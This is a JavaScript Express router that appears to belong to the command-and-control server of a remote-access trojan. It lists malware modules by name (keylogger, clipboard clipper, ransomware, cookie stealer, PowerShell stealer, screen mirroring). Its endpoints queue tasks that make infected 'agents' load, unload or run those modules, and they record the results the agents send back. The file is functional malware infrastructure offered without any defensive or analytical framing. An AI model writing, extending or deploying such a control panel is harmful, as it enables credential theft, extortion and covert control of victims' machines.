const express = require('express');
const { verifyToken } = require('./auth');
const db = require('../database');
const router = express.Router();

// List available modules
router.get('/', verifyToken, async (req, res) => {
    res.json({ 
        modules: [
            'keylogger',
            'clipper', 
            'ransomware',
            'screen_mirror',
            'cookie_stealer',
            'powershell_stealer'
        ] 
    });
});

// Load module on agent
router.post('/load', verifyToken, async (req, res) => {
    const { agentId, moduleName } = req.body;
    
    // Create task to load module
    const taskId = `${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
    
    db.run(
        `INSERT INTO tasks (taskId, agentId, type, moduleName, status, createdAt) 
         VALUES (?, ?, 'module_load', ?, 'pending', datetime('now'))`,
        [taskId, agentId, moduleName],
        function(err) {
            if (err) {
                return res.status(500).json({ error: err.message });
            }
            res.json({ status: 'pending', taskId: taskId, message: 'Module load task created' });
        }
    );
});

// Unload module
router.post('/unload', verifyToken, async (req, res) => {
    const { agentId, moduleName } = req.body;
    
    const taskId = `${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
    
    db.run(
        `INSERT INTO tasks (taskId, agentId, type, moduleName, moduleAction, status, createdAt) 
         VALUES (?, ?, 'module_action', ?, 'unload', 'pending', datetime('now'))`,
        [taskId, agentId, moduleName],
        function(err) {
            if (err) {
                return res.status(500).json({ error: err.message });
            }
            res.json({ status: 'pending', taskId: taskId, message: 'Module unload task created' });
        }
    );
});

// Execute module action
router.post('/action', verifyToken, async (req, res) => {
    const { agentId, moduleName, action, params } = req.body;
    
    const taskId = `${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
    
    db.run(
        `INSERT INTO tasks (taskId, agentId, type, moduleName, moduleAction, params, status, createdAt) 
         VALUES (?, ?, 'module_action', ?, ?, ?, 'pending', datetime('now'))`,
        [taskId, agentId, moduleName, action, params ? JSON.stringify(params) : '{}'],
        function(err) {
            if (err) {
                return res.status(500).json({ error: err.message });
            }
            res.json({ status: 'pending', taskId: taskId, message: 'Module action task created' });
        }
    );
});

// Update task result (called by agent)
router.post('/result', verifyToken, async (req, res) => {
    const { taskId, result, error } = req.body;
    
    const status = error ? 'failed' : 'completed';
    
    db.run(
        `UPDATE tasks SET status = ?, result = ?, error = ?, completedAt = datetime('now') 
         WHERE taskId = ?`,
        [status, result ? JSON.stringify(result) : null, error, taskId],
        function(err) {
            if (err) {
                return res.status(500).json({ error: err.message });
            }
            res.json({ success: true });
        }
    );
});

module.exports = router;